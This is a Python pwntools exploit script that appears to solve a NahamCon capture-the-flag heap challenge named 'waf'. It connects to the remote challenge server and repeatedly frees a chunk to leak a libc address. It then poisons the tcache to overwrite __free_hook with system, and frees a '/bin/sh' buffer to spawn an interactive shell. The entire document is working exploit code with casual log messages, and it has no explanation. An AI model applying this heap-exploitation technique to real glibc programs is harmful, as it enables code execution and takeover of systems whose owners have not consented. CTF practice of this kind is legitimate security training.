from pwn import *
import sys

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('./waf')
libc = elf.libc
#p = elf.process()
p = remote('challenge.nahamcon.com', int(sys.argv[1]))
#gdb.attach(p)

def add(aidi,size,data=b"/bin/sh\x00",activate=b"y"):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(aidi).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', data)
    p.sendlineafter(b': ', activate)

def free():
    p.sendlineafter(b'> ', b'4')

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx,aidi,size,data=b"/bin/sh\x00",activate=b"y"):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(aidi).encode())
    p.sendlineafter(b': ', str(size).encode())
    p.sendlineafter(b': ', data)
    p.sendlineafter(b': ', activate)

log.info("hollup... let him cook")
for i in range(8):
    add(i,0x90,activate=b'y')

log.info("wait.. who let him cook?")
for i in range(8):
    free()

show(0)
p.recvuntil(b"Setting: ")
libc.address = unpack(p.recvn(6),'all') - 0x3ebca0
log.info(f"damn... he got {hex(libc.address)}")

for i in range(4):
    add(i,0x90)

log.info("he cook again... ")
edit(1,90,24,p64(libc.sym.__free_hook)*3)

for i in range(4):
    free()

edit(0,90,24,p64(libc.sym.__free_hook)*2)
add(1,0x90,p64(libc.sym.system))
add(2,0x90,p64(libc.sym.system))
add(3,24,b'/bin/sh\x00')
free()
log.info("sheeesssshhh 🥶🥶")

p.interactive()

